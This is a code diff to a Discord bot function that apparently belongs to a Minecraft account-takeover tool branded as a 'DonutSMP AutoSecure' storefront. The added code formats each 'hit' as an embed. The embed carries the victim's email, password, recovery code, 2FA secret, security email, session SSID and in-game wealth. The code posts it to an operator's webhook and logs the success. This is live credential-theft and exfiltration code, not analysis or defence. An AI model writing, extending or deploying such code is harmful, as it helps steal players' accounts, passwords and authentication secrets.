@@ -90,10 +90,66 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
         if (hasWebhook) {
             try {
                 const webhook = new WebhookClient({ url: config.notifierWebhook });
+                
+                // Build rich Discord hit embed
+                const donutInfo = stats.donut || {};
+                const embedFields = [
+                    { name: "👤 Minecraft Username", value: `\`${stats.username}\``, inline: true },
+                    { name: "📧 Email", value: `\`${accountData.email || accountData.oldEmail || 'N/A'}\``, inline: true },
+                    { name: "🔑 Password", value: `\`${accountData.password || 'N/A'}\``, inline: true },
+                    { name: "🛡️ Recovery Code", value: `\`${accountData.recoveryCode || 'N/A'}\``, inline: true },
+                    { name: "🔐 2FA Secret", value: `\`${accountData.secretkey || 'Disabled'}\``, inline: true },
+                    { name: "📨 Security Email", value: `\`${accountData.secEmail || 'None'}\``, inline: true },
+                ];
+
+                if (stats.donutRank && stats.donutRank !== 'None') {
+                    embedFields.push({ name: "🍩 Donut Rank", value: `**${stats.donutRank}**`, inline: true });
+                }
+                if (stats.donutMoney && stats.donutMoney !== '$0') {
+                    embedFields.push({ name: "💰 Donut Money", value: `\`${stats.donutMoney}\``, inline: true });
+                }
+                if (stats.donutShards && stats.donutShards !== '0') {
+                    embedFields.push({ name: "💎 Donut Shards", value: `\`${stats.donutShards}\``, inline: true });
+                }
+                if (stats.donutPlaytime && stats.donutPlaytime !== '0m') {
+                    embedFields.push({ name: "⏳ Donut Playtime", value: `\`${stats.donutPlaytime}\``, inline: true });
+                }
+                if (stats.donutKDR && stats.donutKDR !== '0.00') {
+                    embedFields.push({ name: "⚔️ Donut K/D", value: `\`${stats.donutKDR}\``, inline: true });
+                }
+                if (stats.networth && stats.networth !== '0') {
+                    embedFields.push({ name: "🏰 Hypixel Networth", value: `\`${stats.networth}\``, inline: true });
+                }
+                if (stats.bedwars && stats.bedwars !== '0') {
+                    embedFields.push({ name: "🛏️ Bedwars Star", value: `\`⭐ ${stats.bedwars}\``, inline: true });
+                }
+                if (accountData.ssid) {
+                    embedFields.push({ name: "🎫 Minecraft SSID", value: `\`\`\`${accountData.ssid.substring(0, 100)}...\`\`\``, inline: false });
+                }
+
+                const hitEmbed = {
+                    title: `🍩 NEW DONUT SMP HIT: ${stats.username}`,
+                    description: `> Tài khoản **${stats.username}** đã được bảo mật thành công qua DonutSMP Storefront!`,
+                    color: 0x38bdf8,
+                    thumbnail: {
+                        url: `https://visage.surgeplay.com/bust/${encodeURIComponent(stats.username)}.png?y=-40&quality=lossless`
+                    },
+                    image: {
+                        url: `attachment://${filename}`
+                    },
+                    fields: embedFields,
+                    footer: {
+                        text: `DonutSMP AutoSecure System • ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`,
+                        icon_url: 'https://website.donutsmp.org/bcGCsev.png'
+                    },
+                    timestamp: new Date().toISOString()
+                };
+
                 await webhook.send({
+                    embeds: [hitEmbed],
                     files: [attachment]
                 });
-                console.log(`[NOTIFIER] Successfully sent hit image to notifierWebhook for ${stats.username}`);
+                console.log(`[NOTIFIER] Successfully sent hit image & embed to notifierWebhook for ${stats.username}`);
             } catch (whErr) {
                 console.error('[NOTIFIER] Error sending hit image to webhook:', whErr.message);
             }
